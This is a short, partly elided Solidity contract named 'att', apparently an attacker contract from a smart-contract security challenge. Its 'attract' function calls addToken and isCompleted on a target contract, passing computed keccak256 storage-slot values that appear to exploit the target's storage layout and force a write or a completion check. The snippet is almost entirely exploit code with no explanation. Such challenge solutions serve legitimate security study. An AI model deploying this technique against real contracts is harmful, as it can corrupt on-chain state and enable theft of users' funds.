...
contract att{
    ...
    function attract() public {
        arr.addToken(address(0), 0);
        arr.isCompleted(getTokenSlot(),getTokenOfUserSlot(),0,address(arr));
    }
    function getTokenSlot() public pure returns(bytes32 a){
        a = bytes32(uint256(keccak256(abi.encodePacked(uint256(0)))));
    }
    function getTokenOfUserSlot() public view returns(bytes32 a){
        a = bytes32(keccak256(abi.encodePacked(uint256(uint160(address(arr))),uint256(1))));
    }
}
